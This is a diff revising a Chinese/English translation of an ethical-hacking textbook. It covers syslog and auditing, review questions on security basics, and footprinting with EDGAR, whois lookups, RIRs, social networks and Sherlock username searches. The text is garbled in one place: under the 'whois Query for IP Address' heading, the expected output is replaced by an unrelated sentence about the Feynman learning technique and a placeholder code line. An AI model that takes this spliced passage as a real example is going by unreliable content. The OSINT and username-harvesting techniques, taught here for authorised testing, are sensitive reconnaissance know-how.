-因为 syslog 支持远程日志记录，它可以作为集中化的日志主机使用。这一点在为应急响应做准备时，可能显得尤为重要。常见的隐藏痕迹的做法是清除日志。任何获得系统访问权限的攻击者可能会擦除本地日志，但如果他们正在将日志流传到外部，则日志会保留供以后使用，除非攻击者能够入侵集中日志主机。
-
-下面的代码块展示了 syslog 消息的示例。每条消息以日期开头，随后是发出消息的主机名。接着是产生日志的进程（包括进程 ID）。最后是进程生成的消息内容。
+下面的代码块展示了 `syslog` 消息的示例。每条消息以日期开头，随后是发出消息的主机名。接着是产生日志的进程（包括进程 ID）。最后是进程生成的消息内容。
 
 ```
 [syslog Messages]
@@ -2649,15 +2788,13 @@ Jun 26 10:32:09 boardinghouse pvedaemon[9338]: <root@pam> end task
 UPID:boardinghouse:00003552:0580F8B5:5B32697E:vncproxy:210:root@pam: OK  
 ```
 
-
-
 每个条目提供关于条目类型的详细信息，这表明审计子系统已检测到什么。例如，第一个条目表明用户已登录。你可以从详细信息中看到，连接的来源地址是 `192.168.86.49`，可执行文件是 `/usr/sbin/sshd`，结果是成功。其他条目表示文件操作、程序执行和配置更改。
 
 与 Windows 审计类似，Linux 审计也需要配置。你通过创建规则来完成，这些规则会被审计守护进程使用。你可以直接在配置文件中进行更改，也可以使用 `auditctl` 命令在命令行上添加规则。这会直接实施更改，是审计系统启动时被调用的内容。写入配置文件中的是将作为参数传递给 `auditctl` 的命令行参数。
 
 ## Summary
 
-在信息安全领域，我们需要掌握的一些基本概念。首先是信息安全的三个基本属性 —  — 机密性、完整性和可用性。机密性是保持秘密信息机密的需求。完整性意味着在不应更改时确保数据保持不变。最后，可用性意味着信息（包括服务）在预期可用时是可用的。除了这三元组之外，保密性、完整性和可用性（即 CIA 三元组）还包括帕克六元组，其进一步增加了实用性、真实性和所有权或控制权。
+在信息安全领域，我们需要掌握的一些基本概念。首先是信息安全的三个基本属性——机密性、完整性和可用性。机密性是保持秘密信息机密的需求。完整性意味着在不应更改时确保数据保持不变。最后，可用性意味着信息（包括服务）在预期可用时是可用的。除了这三元组之外，保密性、完整性和可用性（即 CIA 三元组）还包括帕克六元组，其进一步增加了实用性、真实性和所有权或控制权。
 
 在技术层面，常见的实现包括防火墙。防火墙具有多种功能区域。最基本的防火墙是包过滤，它基于数据包头部进行决策。状态防火墙在决策时会考虑连接的状态。深度包检查防火墙可以检查数据负载以决定是否阻止消息。最后，统一威胁管理设备（有时被称为下一代防火墙）可以将防火墙功能提升到新的水平，同时加入防病毒功能。防病毒会检查网络流量中的恶意软件，而不是等到它到达端点。
 
@@ -2669,205 +2806,259 @@ UPID:boardinghouse:00003552:0580F8B5:5B32697E:vncproxy:210:root@pam: OK
 
 ## Review Questions
 
-1.  为了在恶意软件到达端点之前从网络中清除它，你会使用以下哪种？  
+1. 为了在恶意软件到达端点之前从网络中清除它，你会使用以下哪种？
 
-   1. 包过滤  
-   2. 应用层网关  
-   3. 统一威胁管理设备  
-   4. 状态防火墙  
+   1. 包过滤
 
-2.  如果你在客户现场发现自己在家里留下了一个包含关键数据的外部硬盘，这违反了哪项安全原则？  
+   2. 应用层网关
 
-   1. 机密性  
-   2. 完整性  
-   3. 不可否认性  
-   4. 可用性  
+   3. 统一威胁管理设备
 
-3.  如何计算风险？  
+   4. 状态防火墙
 
-   1. 可能性 × 损失价值  
-   2. 可能性 × 缓解因子  
-   3. (损失价值 + 缓解因子) × (损失价值/可能性)  
-   4. 可能性 × 缓解因子  
+2. 如果你在客户现场发现自己在家里留下了一个包含关键数据的外部硬盘，这违反了哪项安全原则？
 
-4.  以下哪项是防御深度网络设计的因素？  
+   1. 机密性
 
-   1. 交换机  
-   2. 在桌面上使用 Linux  
-   3. 光纤电缆连接  
-   4. 路由器上的访问控制列表  
+   2. 完整性
 
-5.  如何在组织中实现机密性？  
+   3. 不可否认性
 
-   1. 看门狗进程  
-   2. 加密  
-   3. 加密哈希  
-   4. Web 服务器  
+   4. 可用性
 
-6.  入侵检测系统（IDS）可以执行以下哪项功能？  
+3. 如何计算风险？
 
-   1. 阻断流量  
-   2. 基于头部过滤流量  
-   3. 生成流量警报  
-   4. 记录系统消息  
+   1. 可能性 × 损失价值
 
-7.  哪项是完整性丢失的例子？  
+   2. 可能性 × 缓解因子
 
-   1. 用户对文件进行修改并保存  
-   2. 磁盘上出现坏块  
-   3. 信用卡以明文方式传输  
-   4. 因内存故障导致磁盘驱动程序运行错误  
+   3. (损失价值 + 缓解因子) × (损失价值/可能性)
 
-8.  你会使用安全信息事件管理（SIEM）系统做什么？  
+   4. 可能性 × 缓解因子
 
-   1. 聚合并搜索日志数据  
-   2. 管理安全项目  
-   3. 升级安全事件  
-   4. 存储开源情报  
+4. 以下哪项是防御深度网络设计的因素？
 
-9.  远程存储系统日志的重要性在于：  
+   1. 交换机
 
-   1. 本地系统无法承受。  
-   2. 带宽比磁盘更快。  
-   3. 攻击者可能会删除本地日志。  
-   4. 它可以防御攻击。  
+   2. 在桌面上使用 Linux
 
-10. 要让 TCP 会话被状态防火墙视为已建立，需要：  
+   3. 光纤电缆连接
 
-    1. 最终确认报文  
-    2. 三次握手完整  
-    3. 序号对齐  
-    4. SYN 报文收到  
+   4. 路由器上的访问控制列表
 
-11. 安全策略的作用是：  
+5. 如何在组织中实现机密性？
 
-    1. 提供安全角色的高层次指导  
-    2. 为安全人员提供具体指示  
-    3. 增加公司的底线  
-    4. 使标准和实践保持一致  
+   1. 看门狗进程
 
-12. 帕克六元组（Parkerian hexad）在 CIA 三元组之上还增加了哪些属性？  
+   2. 加密
 
-    1. 机密性、意识、真实性  
-    2. 实用性、意识、所有权  
-    3. 实用性、所有权、真实性  
-    4. 所有权、控制、真实性  
+   3. 加密哈希
 
-13. 开启审计后可以暴露的重要事件是：  
+   4. Web 服务器
 
-    1. 系统关机  
-    2. 服务启动  
-    3. 包安装  
-    4. 用户登录  
+6. 入侵检测系统（IDS）可以执行以下哪项功能？
 
-14. 入侵防御系统（IPS）可以做到而入侵检测系统（IDS）不能做到的：  
+   1. 阻断流量
 
-    1. 生成警报  
-    2. 阻断或丢弃网络流量  
-    3. 完成三次握手以应对虚假报文  
-    4. 记录数据包  
+   2. 基于头部过滤流量
 
-15. 下列哪项是应用层网关的例子？  
+   3. 生成流量警报
 
-    1. Web 应用防火墙  
-    2. 运行时应用自我保护  
-    3. Java 小程序  
-    4. 入侵防御系统  
+   4. 记录系统消息
 
-16. 包过滤会使用以下哪项信息来决定允许的流量？  
+7. 哪项是完整性丢失的例子？
 
-    1. HTTP 请求报文  
-    2. 以太网类型  
-    3. UDP 源端口  
-    4. SNMP OID  
+   1. 用户对文件进行修改并保存
 
-17. 下列产品可能用作入侵检测系统（IDS）？  
+   2. 磁盘上出现坏块
 
-    1. Elastic Stack  
-    2. Prewikka  
-    3. Snort  
-    4. Snorby  
+   3. 信用卡以明文方式传输
 
-18. 下列哪项不是导致完整性受损的攻击示例？  
+   4. 因内存故障导致磁盘驱动程序运行错误
 
-    1. 缓冲区溢出  
-    2. 中间人攻击  
-    3. 堆喷射  
-    4. 水坑攻击  
+8. 你会使用安全信息事件管理（SIEM）系统做什么？
 
-19. 哪种攻击会直接导致可用性的妥协？  
+   1. 聚合并搜索日志数据
 
-    1. 水坑攻击  
-    2. 拒绝服务（DoS）  
-    3. 钓鱼  
-    4. 缓冲区溢出  
+   2. 管理安全项目
 
-20. EDR（端点检测与响应）能为安全运营人员提供哪项重要功能？  
+   3. 升级安全事件
 
+   4. 存储开源情报
 
+9. 远程存储系统日志的重要性在于：
 
+   1. 本地系统无法承受。
 
-1. `主机隔离`
+   2. 带宽比磁盘更快。
 
-2. `恶意软件检测`
+   3. 攻击者可能会删除本地日志。
 
-3. `远程数据收集`
+   4. 它可以防御攻击。
 
-4. `以上全部`
+10. 要让 TCP 会话被状态防火墙视为已建立，需要：
 
-21. `哪种类型的安全控制是防火墙？`
+    1. 最终确认报文
 
-1. `行政`
+    2. 三次握手完整
 
-2. `物理`
+    3. 序号对齐
 
-3. `技术`
+    4. SYN 报文收到
 
-4. `纠正`
+11. 安全策略的作用是：
 
-22. `管理已被告知存在一种因公司开发和管理的应用程序而导致的个人可识别信息（PII）风险。他们已选择对此风险不采取任何措施。他们采取了何种风险管理方法？`
+    1. 提供安全角色的高层次指导
 
-1. `风险转移`
+    2. 为安全人员提供具体指示
 
-2. `风险规避`
+    3. 增加公司的底线
 
-3. `风险缓解`
+    4. 使标准和实践保持一致
 
-4. `风险接受`
+12. 帕克六元组（Parkerian hexad）在 CIA 三元组之上还增加了哪些属性？
 
-23. `你被要求实施一套标准以支持政策。你在开发什么类型的安全控制？`
+    1. 机密性、意识、真实性
 
-1. `行政`
+    2. 实用性、意识、所有权
 
-2. `纠正`
+    3. 实用性、所有权、真实性
 
-3. `逻辑`
+    4. 所有权、控制、真实性
 
-4. `功能`
+13. 开启审计后可以暴露的重要事件是：
 
-24. `你的风险管理团队要求一个技术控制，以减轻可能与内部威胁相关的风险。以下哪项控制可以实现此目的？`
+    1. 系统关机
 
-1. `安全策略`
+    2. 服务启动
 
-2. `身份和访问管理（IAM）解决方案`
+    3. 包安装
 
-3. `安全标准`
+    4. 用户登录
 
-4. `主机防火墙`
+14. 入侵防御系统（IPS）可以做到而入侵检测系统（IDS）不能做到的：
 
-25. `攻击者已注册域名 \`facebookmailings.com\`，用于发送钓鱼消息。这属于 MITRE ATT&CK 框架的哪个类别？`
+    1. 生成警报
 
-1. `初始访问`
+    2. 阻断或丢弃网络流量
 
-2. `横向移动`
+    3. 完成三次握手以应对虚假报文
 
-3. `凭据访问`
+    4. 记录数据包
 
-4. `资源开发`
+15. 下列哪项是应用层网关的例子？
 
-## 第 4 章  
+    1. Web 应用防火墙
 
-###  foot-printing and Reconnaissance（侦察与足迹）
+    2. 运行时应用自我保护
+
+    3. Java 小程序
+
+    4. 入侵防御系统
+
+16. 包过滤会使用以下哪项信息来决定允许的流量？
+
+    1. HTTP 请求报文
+
+    2. 以太网类型
+
+    3. UDP 源端口
+
+    4. SNMP OID
+
+17. 下列产品可能用作入侵检测系统（IDS）？
+
+    1. Elastic Stack
+
+    2. Prewikka
+
+    3. Snort
+
+    4. Snorby
+
+18. 下列哪项不是导致完整性受损的攻击示例？
+
+    1. 缓冲区溢出
+
+    2. 中间人攻击
+
+    3. 堆喷射
+
+    4. 水坑攻击
+
+19. 哪种攻击会直接导致可用性的妥协？
+
+    1. 水坑攻击
+
+    2. 拒绝服务（DoS）
+
+    3. 钓鱼
+
+    4. 缓冲区溢出
+
+20. EDR（端点检测与响应）能为安全运营人员提供哪项重要功能？
+
+    1. `主机隔离`
+
+    2. `恶意软件检测`
+
+    3. `远程数据收集`
+
+    4. `以上全部`
+
+21. 哪种类型的安全控制是防火墙？
+
+    1. `行政`
+
+    2. `物理`
+
+    3. `技术`
+
+    4. `纠正`
+
+22. 管理已被告知存在一种因公司开发和管理的应用程序而导致的个人可识别信息（PII）风险。他们已选择对此风险不采取任何措施。他们采取了何种风险管理方法？
+
+    1. `风险转移`
+
+    2. `风险规避`
+
+    3. `风险缓解`
+
+    4. `风险接受`
+
+23. 你被要求实施一套标准以支持政策。你在开发什么类型的安全控制？
+
+    1. `行政`
+
+    2. `纠正`
+
+    3. `逻辑`
+
+    4. `功能`
+
+24. 你的风险管理团队要求一个技术控制，以减轻可能与内部威胁相关的风险。以下哪项控制可以实现此目的？
+
+    1. `安全策略`
+
+    2. `身份和访问管理（IAM）解决方案`
+
+    3. `安全标准`
+
+    4. `主机防火墙`
+
+25. 攻击者已注册域名 `facebookmailings.com`，用于发送钓鱼消息。这属于 MITRE ATT&CK 框架的哪个类别？
+
+    1. `初始访问`
+
+    2. `横向移动`
+
+    3. `凭据访问`
+
+    4. `资源开发`
+
+# 第 4 章 侦察与足迹
+
+## 侦察与足迹（foot-printing and Reconnaissance）
 
 普遍认为攻击者在发动攻击前会进行大量前期工作。他们会了解攻击面的大小以及目标的位置。这需要大量工作，动用多种工具和技能。获取目标规模和范围的过程称为 *footprinting*——也就是说，攻击者（或你，伦理黑客）试图收集目标组织的足迹。在伦理黑客实践中，你可能会得到目标方的帮助，他们会雇佣你提供服务。他们可能会给你一些立足点，帮助你了解应做的范围和规模。不过，也有可能你是一无所知，需要自己寻找立足点。
 
@@ -2893,12 +3084,9 @@ UPID:boardinghouse:00003552:0580F8B5:5B32697E:vncproxy:210:root@pam: OK
 
 获取目标开源情报的起点有几个。第一是整体审视公司。你需要收集公司的各个地点信息。虽然在某些情况下这很容易获取，但越来越多的情况并非如此。原因在于公司认识到提供越多信息，越可能被用于针对他们的攻击。除非受法规要求，否则他们通常不会主动提供这些信息。有一些资源可以用于获取公司信息。
 
-
-
-
 有时，这些资源可以用于收集信息，这些信息可能被用于社会工程攻击。在某些情况下，你可以获取公司网络的详细信息。这两类信息都可能有用。关于公司及其组织和治理结构的信息，可能来自美国政府维护的数据库（针对在美国注册的企业）；而关于公司网络的信息，则可能来自负责互联网治理的组织所维护的数据库。
 
-# EDGAR
+#### EDGAR
 
 公开公司必须提供关于自己的信息。你可以使用的资源用于查找这些信息。在此过程中，你可能会收集到公司的组织结构信息。组织结构可以告诉你谁担任什么职位，因此在以后通过电子邮件收集更多信息时，你会知道信息应来自哪位人员。
 
@@ -2914,15 +3102,17 @@ UPID:boardinghouse:00003552:0580F8B5:5B32697E:vncproxy:210:root@pam: OK
 
 **FIGURE 4.2** Portion of Schedule 14A for Microsoft
 
-## Domain Registrars
+#### Domain Registrars
 
 EDGAR 仅适用于公开公司。并非所有公司都是公开的，私人公司的信息透明度不如公开公司。不过，EDGAR 并不是唯一可以用于收集公司信息的资源。另一个与互联网本身相关的信息来源是域名注册商。你从域名注册商获取的信息与 EDGAR 获得的信息并不相同，但有时仍是可靠的来源。例如，你可以获取公司可能的总部地址。
+
+
 
 这并不保证万无一失。如前所述，公司正在隐藏在注册商处提供的信息。信息被注册商隐藏。当你查询时，你得到的只是注册商被要求展示的内容，未必是真实的详细信息。除非注册商在核实信用卡支付的账单地址，否则并没有义务提供真实地址。事实上，我曾经看到过域名登记时使用了虚假的电话号码和错误的地址。由于数据是公开的，务必谨慎对待共享内容。任何人都可以挖掘注册管理系统中的这些信息，并将其用于各种目的。
 
 在我们继续前进之前，了解互联网在域名和地址治理方面的运作方式可能很有帮助。首先，互联网名称与数字管理局（ICANN）负责域名和数字的管理。ICANN 下属的互联网数字管理局（IANA）负责管理 IP 地址、端口、协议以及其他与互联网功能密切相关的关键数字。1998 年 ICANN 成立之前，IANA 的职能由一位名叫 Jon Postel 的人负责，他同时也维护了请求评论（RFC）文档。
 
-除了 ICANN，负责名称和编号的还有域名注册商。这些组织存储它们负责的地址以及联系人信息。过去，注册域名及相关数据需要通过单一实体完成，但现在有多家公司提供注册人功能。如果你想注册域名，通常会前往 DomainMonger 或 GoDaddy 等注册商公司。这些公司随后可以被查询，以获取关于域名的详细信息。
+除了 ICANN，负责名称和编号的还有域名注册商。这些组织存储它们负责的地址以及联系人信息。过去，注册域名及相关数据需要通过单一实体完成，但现在有多家公司提供注册人功能。如果你想注册域名，通常会前往 `DomainMonger` 或 `GoDaddy` 等注册商公司。这些公司随后可以被查询，以获取关于域名的详细信息。
 
 要从区域互联网注册机构（RIR）中获取信息，可以使用 `whois` 程序。这是一款在大多数类 Unix 系统（包括 Linux 和 macOS）上可在命令行运行的工具，也有网站提供 `whois` 实现，方便不具备 Unix 环境的用户。下面是一段 `whois` 查询的输出示例：
 
@@ -2930,84 +3120,153 @@ EDGAR 仅适用于公开公司。并非所有公司都是公开的，私人公�
 whois Query of wiley.com
 ```
 
-
-
 whois wiley.com
+
 Domain Name: WILEY.COM
+
     Registry Domain ID: 936038_DOMAIN_COM-VRSN
+
     Registrar WHOIS Server: whois.corporatedomains.com
+
     Registrar URL: http://cscdbs.com
+
     Updated Date: 2021-08-30T16:27:21Z
+
     Creation Date: 1994-10-12T04:00:00Z
+
     Registry Expiry Date: 2023-10-11T04:00:00Z
+
     Registrar: CSC Corporate Domains, Inc.
+
     Registrar IANA ID: 299
+
     Registrar Abuse Contact Email: domainabuse@cscglobal.com
+
     Registrar Abuse Contact Phone: 8887802723
+
     Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
+
     Name Server: AUS-IBEXTDNS-01.WILEY.COM
+
     Name Server: CAR-IBEXTDNS-01.WILEY.COM
+
     DNSSEC: unsigned
+
     URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/ 
+
 ←- SNIP →
+
 Domain Name: wiley.com
+
 Registry Domain ID: 936038_DOMAIN_COM-VRSN
+
 Registrar WHOIS Server: whois.corporatedomains.com
+
 Registrar URL: www.cscprotectsbrands.com
+
 Updated Date: 2021-08-30T12:27:21Z
+
 Creation Date: 1994-10-12T00:00:00Z
+
 Registrar Registration Expiration Date: 2023-10-11T04:00:00Z
+
 Registrar: CSC CORPORATE DOMAINS, INC.
+
 Sponsoring Registrar IANA ID: 299
+
 Registrar Abuse Contact Email: domainabuse@cscglobal.com
+
 Registrar Abuse Contact Phone: +1.8887802723
+
 Domain Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited
+
 Registry Registrant ID:
+
 Registrant Name: Domain Administrator
+
 Registrant Organization: John Wiley & Sons, Inc
+
 Registrant Street: 111 River Street
+
 Registrant City: Hoboken
+
 Registrant State/Province: NJ
+
 Registrant Postal Code: 07030
+
 Registrant Country: US
+
 Registrant Phone: +1.3175723355
+
 Registrant Phone Ext:
+
 Registrant Fax: +1.3175724355
+
 Registrant Fax Ext:
+
 Registrant Email: domains@wiley.com
+
 Registry Admin ID:
+
 Admin Name: Domain Administrator
+
 Admin Organization: John Wiley & Sons, Inc
+
 Admin Street: 111 River Street
+
 Admin City: Hoboken
+
 Admin State/Province: NJ
+
 Admin Postal Code: 07030
+
 Admin Country: US
+
 Admin Phone: +1.3175723355
+
 Admin Phone Ext:
+
 Admin Fax: +1.3175724355
+
 Admin Fax Ext:
+
 Admin Email: domains@wiley.com
+
 Registry Tech ID:
+
 Tech Name: Electronic Support Services
+
 Tech Organization: John Wiley & Sons Inc
+
 Tech Street: 111 River Street
+
 Tech City: Hoboken
+
 Tech State/Province: NJ
+
 Tech Postal Code: 07030
+
 Tech Country: US
+
 Tech Phone: +1.3175723100
+
 Tech Phone Ext:
+
 Tech Fax: +1.3175724355
+
 Tech Fax Ext:
+
 Tech Email: domains@wiley.com
+
 Name Server: car-ibextdns-01.wiley.com
+
 Name Server: aus-ibextdns-01.wiley.com
+
 DNSSEC: unsigned There is a lot of output there to look through, and I've snipped out a bunch of it to keep it to really relevant information. First, `whois` checks with IANA's `whois` server to figure out who it needs to check with about this specific domain. You can see that happen at the very top of the output. IANA indicates that CSC Corporate Domains is the registrar for this domain. We get the details about the registrar CSC Corporate Domains. After that, and a lot of information being snipped out, we finally get the details about the domain `wiley.com`. What you can see in the output is the address and phone number for the company. Additionally, you get information about a handful of contacts for the company. Registrars expect an administrative contact and a technical contact.
 
 As indicated earlier, not all domains will provide this level of detail. An example of a domain that doesn't include any contact details is `spamhaus.org`. Here you can see that the contact information shows that the data has been redacted for privacy.
 
-**Details About `spamhaus.org`**
+## Details About `spamhaus.org`
 
 ```
 Domain Name: spamhaus.org
@@ -3038,46 +3297,51 @@ Registrant Phone: REDACTED FOR PRIVACY
 Registrant Phone Ext: REDACTED FOR PRIVACY
 Registrant Fax: REDACTED FOR PRIVACY
 Registrant Fax Ext: REDACTED FOR PRIVACY 
- 
 ```
-Using a strategy like this will keep information private and out of the hands of the very people `spamhaus.org` seeks to protect against. The data provided can be used to create a mailing list for spammers. It can also be used to create a physical mailing list for traditional junk mail providers (sometimes called *mail marketing companies*).
 
-#### Regional Internet Registries
+Using a strategy like this will keep information private and out of the hands of the very people `spamhaus.org` seeks to protect against. The data provided can be used to create a mailing list for spammers. It can also be used to create a physical mailing list for traditional junk mail providers (sometimes called `mail marketing companies`).
+
+## Regional Internet Registries
 
 Not all the useful information is stored with the domain registrars, however. There is other data that is important to be kept. Earlier, we discussed IANA. While the IANA server provided information about domain registrars, its purpose has long been to be a central clearinghouse for addresses. This includes not only port numbers for well‑known services but also IP addresses. IANA, at a high level, owns all IP addresses. It hands out those IP addresses, based on need, to the RIRs. The RIRs then hand them out to organizations that fall into their geographic region.
 
 There are five RIRs around the world. They are based in different geographic regions, and an organization would refer to the RIR where they are located for things like IP addresses. The RIRs and the geographic areas they are responsible for are listed here:
 
-*   **African Network Information Center (AfriNIC)**   Africa
+*   `African Network Information Center (AfriNIC)` Africa
 
-*   **American Registry for Internet Numbers (ARIN)**   United States and Canada, as well as Antarctica and parts of the Caribbean
+*   `American Registry for Internet Numbers (ARIN)` United States and Canada, as well as Antarctica and parts of the Caribbean
 
-*   **Asia Pacific Network Information Centre (APNIC)**   Asia, Australia, New Zealand, and neighboring countries
+*   `Asia Pacific Network Information Centre (APNIC)` Asia, Australia, New Zealand, and neighboring countries
 
-*   **Latin America and Caribbean Network Information Centre (LACNIC)**   Latin America and parts of the Caribbean
+*   `Latin America and Caribbean Network Information Centre (LACNIC)` Latin America and parts of the Caribbean
 
-*   **Réseaux IP Européens Network Coordination Centre (RIPE NCC)**   Europe, Russia, Greenland, the Middle East, and parts of Central Asia
+*   `Réseaux IP Européens Network Coordination Centre (RIPE NCC)` Europe, Russia, Greenland, the Middle East, and parts of Central Asia
+
+
 
 All of these RIRs have their own databases that can be queried using `whois`, just as we used `whois` to query information from the domain registrars. Typically, you would use `whois` against the RIRs to find out who owns a particular IP address. For example, in the output for `wiley.com` earlier, part of the output indicated which name servers the domain uses to resolve hostnames to IP addresses. One of those name servers is `car-ibextdns-01.wiley.com`. With a minimal amount of effort (we will cover DNS in the section “Domain Name System” later in this chapter), we can discover that the hostname `car-ibextdns-01.wiley.com` resolves to the IP address 63.97.119.2. Using `whois`, we can find out who owns that IP address. You can see the results of that query in the following code.
 
-`whois` **Query for IP Address**
+## `whois` Query for IP Address
 
+- [whois 63.97.119.2](https://whois.example.org/63.97.119.2)的灵感源于诺贝尔物理奖获得者**Richard Feynman**，即**理查德·费曼**。
 
-
-
--   [whois 63.97.119.2](https://whois.example.org/63.97.119.2)的灵感源于诺贝尔物理奖获得者**Richard Feynman**，即**理查德·费曼**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
+- 社交网络站点是人们建立联系的方式。它们有多种不同的类型，已经存在了超过二十年，第一个是 `sixdegrees.com`，于 1997 年推出。像 Myspace 这样的站点允许用户与他人分享音乐和个人信息。Facebook 允许用户创建社区、分享新闻和信息，并与失去联系的朋友重新联系。Twitter 经常用于新闻和更新，以及营销信息——例如发布公告。LinkedIn 适用于各种商业目的，包括分享公司活动、个人成就和人员变动的更新。
 
+![FIGURE 4.3 PeekYou output**FIGURE 4.3** PeekYou output](img/c04f003.png)
 
--   社交网络站点是人们建立联系的方式。它们有多种不同的类型，已经存在了超过二十年，第一个是 `sixdegrees.com`，于 1997 年推出。像 Myspace 这样的站点允许用户与他人分享音乐和个人信息。Facebook 允许用户创建社区、分享新闻和信息，并与失去联系的朋友重新联系。Twitter 经常用于新闻和更新，以及营销信息——例如发布公告。LinkedIn 适用于各种商业目的，包括分享公司活动、个人成就和人员变动的更新。
+你可以花大量时间在上述站点上手动查找信息。此外，还有工具可以使用。其中之一是我们已经看过的工具。除了使用传统搜索引擎如 Google 和 Bing，`theHarvester` 还会在一些社交网络站点中进行搜索。还有专门针对某些站点的工具，例如 LinkedIn，你可以使用 `CrossLinked`。最后，我们有一个像 `Maltego` 这样的工具，它适合一般的开源情报搜集，但也可以用于在社交网络站点中搜索关于个人和公司的详细信息。
 
-![FIGURE 4.3 PeekYou output**FIGURE 4.3** PeekYou output 你可以花大量时间在上述站点上手动查找信息。此外，还有工具可以使用。其中之一是我们已经看过的工具。除了使用传统搜索引擎如 Google 和 Bing，theHarvester 还会在一些社交网络站点中进行搜索。还有专门针对某些站点的工具，例如 LinkedIn，你可以使用 CrossLinked。最后，我们有一个像 Maltego 这样的工具，它适合一般的开源情报搜集，但也可以用于在社交网络站点中搜索关于个人和公司的详细信息。#### Facebook 虽然主要被视为个人站点的网站可能更侧重于个人，但它们仍然对从事伦理黑客工作的人有用。像 Facebook 这样的站点很有趣，因为人们在那里放松警惕，发布大量或许不该发布的信息。他们往往没有意识到他们发布的内容有多少是可搜索的。随着时间的推移，Facebook 大幅提升了可获取的信息量，尽管仍不够理想。多年前，有一个网站 `www.weknowwhatyouredoing.com`，它会搜索 Facebook 帖子并将其分为四类——想被解雇的人、宿醉的人、服用毒品的人以及换了新手机号码的人。Figure 4.4 展示了该站点下线前的部分帖子（因为其使用的 API 已不再可用）。![FIGURE 4.4 www.weknowwhatyouredoing.com](img/c04f004.png)
+### Facebook
+
+虽然主要被视为个人站点的网站可能更侧重于个人，但它们仍然对从事伦理黑客工作的人有用。像 Facebook 这样的站点很有趣，因为人们在那里放松警惕，发布大量或许不该发布的信息。他们往往没有意识到他们发布的内容有多少是可搜索的。随着时间的推移，Facebook 大幅提升了可获取的信息量，尽管仍不够理想。多年前，有一个网站 `www.weknowwhatyouredoing.com`，它会搜索 Facebook 帖子并将其分为四类——想被解雇的人、宿醉的人、服用毒品的人以及换了新手机号码的人。Figure 4.4 展示了该站点下线前的部分帖子（因为其使用的 API 已不再可用）。
+
+![FIGURE 4.4 www.weknowwhatyouredoing.com](img/c04f004.png)
 
 **FIGURE 4.4** `www.weknowwhatyouredoing.com`
 
@@ -3103,35 +3367,55 @@ if (condVar > someVal) {console.log("xxx")}
 
 有时，人们会在状态更新中发布关于工作的信息，包括他们当天的活动，或者他们在另一个工作地点签入。这些信息对你可能很有用。然而，像 Facebook 这样的网站并不总是最适合获取关于企业和员工的信息。还有其他社交网络站点可能会更高效。
 
-#### Username Search
+### Username Search
 
-凭证常被攻击者用来访问他们本不应有访问权限的资源。一旦你识别出目标人物，获取他们的用户名可能会很有用。工具 Sherlock 可能对识别人物和用户名有帮助。这是 ParrotOS 默认安装的程序。你提供一个想要查找的用户名列表，它会在数百个社交网络中搜索这些用户名。当然，找到一个用户名并不保证它是你要找的人。但知道用户名有助于进行可能的登录攻击。运行 Sherlock 的示例命令如下，它提供了三个不同的用户名并指定了用于存放输出文本文件的目录。以下是运行该命令后的输出样本。
+凭证常被攻击者用来访问他们本不应有访问权限的资源。一旦你识别出目标人物，获取他们的用户名可能会很有用。工具 `Sherlock` 可能对识别人物和用户名有帮助。这是 ParrotOS 默认安装的程序。你提供一个想要查找的用户名列表，它会在数百个社交网络中搜索这些用户名。当然，找到一个用户名并不保证它是你要找的人。但知道用户名有助于进行可能的登录攻击。运行 `Sherlock` 的示例命令如下，它提供了三个不同的用户名并指定了用于存放输出文本文件的目录。以下是运行该命令后的输出样本。
 
 **Using Sherlock**
 
-
-
+```bash
 $ sherlock --fo smithsearch jsmith smith johnsmith
+
 [*] Checking username jsmith on:
+
 [+] 7Cups: https://www.7cups.com/@jsmith
+
 [+] 9GAG: https://www.9gag.com/u/jsmith
+
 [+] About.me: https://about.me/jsmith
+
 [+] Academia.edu: https://independent.academia.edu/jsmith
+
 [+] Airbit: https://airbit.com/jsmith
+
 [+] Airliners: https://www.airliners.net/user/jsmith/profile/photos
+
 [+] AllMyLinks: https://allmylinks.com/jsmith
+
 [+] Apple Developer: https://developer.apple.com/forums/profile/jsmith
+
 [+] Apple Discussions: https://discussions.apple.com/profile/jsmith
+
 [+] Archive of Our Own: https://archiveofourown.org/users/jsmith
+
 [+] Archive.org: https://archive.org/details/@jsmith
+
 [+] Arduino: https://create.arduino.cc/projecthub/jsmith
+
 [+] Asciinema: https://asciinema.org/~jsmith
+
 [+] AskFM: https://ask.fm/jsmith
+
 [+] Audiojungle: https://audiojungle.net/user/jsmith
+
 [+] BLIP.fm: https://blip.fm/jsmith
+
 [+] Behance: https://www.behance.net/jsmith
+
 [+] BiggerPockets: https://www.biggerpockets.com/users/jsmith
+
 [+] Bikemap: https://www.bikemap.net/en/u/jsmith/routes/created/
+```
 
 LinkedIn has been around for about two decades as of this writing. In spite of a number of competitors (such as Plaxo) going out of business or just no longer being in the space, LinkedIn is still around. It continues to expand its offerings beyond the very early days, when it was basically a contact manager. These days, LinkedIn is a business networking opportunity, highly useful for those in sales. It is also a great source for identifying jobs you may be interested in. It seems like human resources people, specifically recruiters, commonly use LinkedIn to find people to fill positions, whether it's an internal recruiter or someone who works for a recruiting company.
 
@@ -3147,13 +3431,15 @@ Job listings are another place to look for details beyond the statistics about a
 
 **FIGURE 4.9** Job requirements for a network security engineer
 
-We don't have to limit ourselves to the web interface, though, since it can be tedious to keep typing things and flicking through pages. Sometimes you want to be able to script a search without writing a program or manually using a web page. Formerly, there was a tool called InSpy that worked well for searching through LinkedIn. Unfortunately, the latest version of InSpy available on Kali, 3.0.0, generates 404 errors trying to search for details. The instructions also require the use of an API key. With a little work, though, you can use another tool to do the LinkedIn searching for you.
+We don't have to limit ourselves to the web interface, though, since it can be tedious to keep typing things and flicking through pages. Sometimes you want to be able to script a search without writing a program or manually using a web page. Formerly, there was a tool called `InSpy` that worked well for searching through LinkedIn. Unfortunately, the latest version of `InSpy` available on Kali, 3.0.0, generates 404 errors trying to search for details. The instructions also require the use of an API key. With a little work, though, you can use another tool to do the LinkedIn searching for you.
+
+
 
